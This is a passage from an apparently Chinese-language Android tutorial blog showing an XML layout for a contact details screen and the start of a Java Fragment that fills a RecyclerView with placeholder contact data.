src="https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".txlDetails"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"åå­—"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.008"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout4"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/returnButton"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"408dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"è¿”å›"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"146dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"æ ‡ç­¾"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"188dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"æœªåˆ†ç±»"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.441"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.611"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"141dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"åœ°åŒº"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"æœªçŸ¥"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.773"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.501"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"154dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"121dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.498"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.042"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"28dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"ç”µè¯å·ç "</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"0dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phone"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"36dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"11111111111"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.058"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.388"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"152dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"å¾®ä¿¡æ˜µç§°"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.0"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>è®¾ç½®äº†ä¸€äº›åŸºç¡€ä¿¡æ¯</p><h3 id="2-æ ¸å¿ƒä»£ç å®ç°"><a href="#2-æ ¸å¿ƒä»£ç å®ç°" class="headerlink" title="2. æ ¸å¿ƒä»£ç å®ç°"></a>2. æ ¸å¿ƒä»£ç å®ç°</h3><h4 id="2-1-åœ¨txlFragmenté‡Œé¢å®ç°äº†åˆå§‹åŒ–æ“ä½œï¼Œå¹¶ç”Ÿæˆæ•°æ®æ•°ç»„ï¼Œåˆ›å»ºRecycleViewå®ä¾‹å’Œè®¾ç½®Adapter"><a href="#2-1-åœ¨txlFragmenté‡Œé¢å®ç°äº†åˆå§‹åŒ–æ“ä½œï¼Œå¹¶ç”Ÿæˆæ•°æ®æ•°ç»„ï¼Œåˆ›å»ºRecycleViewå®ä¾‹å’Œè®¾ç½®Adapter" class="headerlink" title="2.1 åœ¨txlFragmenté‡Œé¢å®ç°äº†åˆå§‹åŒ–æ“ä½œï¼Œå¹¶ç”Ÿæˆæ•°æ®æ•°ç»„ï¼Œåˆ›å»ºRecycleViewå®ä¾‹å’Œè®¾ç½®Adapter"></a>2.1 åœ¨txlFragmenté‡Œé¢å®ç°äº†åˆå§‹åŒ–æ“ä½œï¼Œå¹¶ç”Ÿæˆæ•°æ®æ•°ç»„ï¼Œåˆ›å»ºRecycleViewå®ä¾‹å’Œè®¾ç½®Adapter</h4><p><strong>ä»£ç </strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.ItemTouchHelper;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br>    <span class="hljs-comment">//è·å–recyclerViewå¯¹è±¡å¹¶ä¸”å®ä¾‹åŒ–é€‚é…å™¨</span><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> MyAdapter myAdapter;<br>    LinearLayout linearLayout;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fra_lx, container, false);</span><br>        View view;<br>        <span class="hljs-comment">//å­˜æ‰€æœ‰æ§ä»¶çš„è§†å›¾</span><br>        view=inflater.inflate(R.layout.item, container, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//è°ƒç”¨recycleviewæ§ä»¶</span><br>        recyclerView=view.findViewById(R.id.itemview);<br>        linearLayout=view.findViewById(R.id.linearLayout_txl);<br>        <span class="hljs-comment">//åˆ›å»ºæ•°æ®</span><br>        String[] names={<span class="hljs-string">"Pappy"</span>,<span class="hljs-string">"Mommy"</span>,<span class="hljs-string">"Sister"</span>,<span class="hljs-string">"Little Sister"</span>,<span class="hljs-string">"Brother"</span>,<span class="hljs-string">"Little Brother"</span>,<span class="hljs-string">"Roommate"</span>};<br>        <span class="hljs-type">int</span>[] images={R.drawable.baba,R.drawable.mama,R.drawable.jiejie,R.drawable.meimei,R.drawable.gege,<br>                R.drawable.didi,R.drawable.shiyou1};<br>        String[] phones={<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<br>                <span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>};<br>        String[] regions={<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"å››å· å—å……"</span>,<span class="hljs-string">"æ¹–åŒ— æ­¦æ±‰"</span>};<br>        String[] tags={<span 